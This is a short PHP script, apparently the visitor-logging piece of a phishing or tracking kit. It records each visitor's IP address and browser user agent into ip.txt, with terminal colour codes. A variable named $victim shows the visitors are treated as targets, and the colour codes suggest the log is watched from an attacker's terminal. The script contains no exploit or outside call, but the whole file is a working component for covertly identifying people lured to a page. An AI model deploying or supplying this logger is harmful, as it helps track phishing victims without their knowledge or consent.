<?php

if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
    }
else
    {
      $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
    }
$useragent = " User-Agent: ";
$browser = $_SERVER['HTTP_USER_AGENT'];


$file = 'ip.txt';
$victim = "";
$fp = fopen($file, 'a');

//fwrite($fp, " IP: " . $victim);
fwrite($fp, "\e[1;34m IP: \e[0;32m" . $ipaddress);
//fwrite($fp, " IDK: " . $useragent);
fwrite($fp, "\e[1;34m Navergador: \e[0;32m" . $browser);

fclose($fp);
